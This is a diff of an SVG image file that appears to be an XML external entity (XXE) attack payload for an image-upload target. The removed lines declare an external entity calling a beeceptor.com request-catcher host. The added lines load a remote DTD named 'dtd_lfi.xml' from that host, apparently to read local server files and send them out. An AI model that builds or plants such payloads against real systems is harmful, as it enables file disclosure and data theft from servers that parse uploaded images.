@@ -1,6 +1,7 @@
-<!DOCTYPE foo [
-<!ENTITY xxe SYSTEM "https://wh888868bd036c57cb0e.free.beeceptor.com">
-]>
-<svg width="250" height="250" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-<rect width="250" height="250" fill="&xxe;" />
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="500">
+  <defs>
+    <!ENTITY % dtd SYSTEM "https://wh888868bd036c57cb0e.free.beeceptor.com/dtd_lfi.xml">
+    %dtd;
+  </defs>
+  <rect width="100%" height="100%" fill="blue"/>
 </svg>
